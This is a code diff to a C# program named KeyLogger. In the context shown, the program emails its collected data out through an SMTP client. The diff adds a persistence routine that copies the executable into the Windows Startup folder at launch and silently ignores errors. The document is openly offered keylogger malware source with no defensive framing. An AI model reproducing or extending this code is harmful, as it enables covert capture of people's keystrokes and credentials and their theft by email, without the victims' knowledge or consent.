@@ -4,6 +4,7 @@ using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace KeyLogger
 {
@@ -17,6 +18,7 @@ namespace KeyLogger
 
         static void Main(string[] args)
         {
+            Copyitself();
             String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
             if (!Directory.Exists(filepath))
@@ -275,6 +277,32 @@ namespace KeyLogger
             mailMessage.Body = emailBody;
 
             client.Send(mailMessage);
+        }
+
+        public static void Copyitself() // Program copies itself to windows autorun
+        {
+
+            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+
+            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile + ".exe";
+
+            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe";
+
+            try
+            {
+
+                //COPY THIS PROGRAM TO STARTUP
+                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe"))
+                {
+                    File.Copy(Path, Filepath);
+                }
+
+            }
+            catch (Exception e)
+            {
+
+            }
+
         }
     }
 }
